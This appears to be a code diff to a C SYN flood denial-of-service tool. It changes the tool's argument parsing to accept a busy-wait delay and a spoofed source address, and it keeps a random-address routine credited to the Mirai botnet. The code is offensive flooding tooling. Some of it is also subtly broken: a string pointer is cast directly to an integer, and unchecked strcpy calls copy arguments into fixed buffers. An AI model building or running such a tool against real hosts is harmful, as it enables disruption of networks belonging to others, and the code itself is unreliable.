@@ -245,27 +245,6 @@ void checkIPbuffer(char *IPbuffer)
     }
 }
 
-char* get_default_src_addr(void) {
-	char hostbuffer[256];
-    int hostname;
-	struct hostent *host_entry;
-	char *IPbuffer;
- 
-    // To retrieve hostname
-    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
-    if (hostname == -1) {
-		return "127.0.0.1";
-	}
-
-    host_entry = gethostbyname(hostbuffer);
-	if (host_entry == NULL) {
-		return "127.0.0.1";
-	} 
-
-    IPbuffer = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
-    return IPbuffer
-}
-
 static uint32_t random_ipv4(void) {
 	// Adapted from Mirai (https://github.com/jgamblin/Mirai-Source-Code)
 	uint32_t addr;
@@ -352,6 +331,7 @@ int main(int argc, char *argv[]) {
 	// Get target (and optionally source) IP address
 	char dst_addr[32];
 	uint16_t dst_port;
+	uint16_t busywait = 0;
 
 	if (argc > 1) {
 		strcpy(dst_addr, argv[1]);
@@ -360,12 +340,16 @@ int main(int argc, char *argv[]) {
 		// } else {
 		// 	dst_port = default_dst_port;
 		// }
+		if (argc > 2) {
+			busywait = (uint16_t) argv[2];
+			if (argc > 3) {
+				strcpy(default_src_addr, argv[3]);
+			}
+		}
 	} else {
-		printf("Please specify a target IP address, and optionally a port number (default destination port is 53).\nExample usage: syn_flood 127.0.0.1 80\n");
+		printf("Please specify a target IP address\n");
 		exit(1);
 	}
-
-	default_src_addr = get_default_src_addr();
 
 	#if DEBUG
 		printf ("Flooding target %s:%u\n", dst_addr, dst_port);
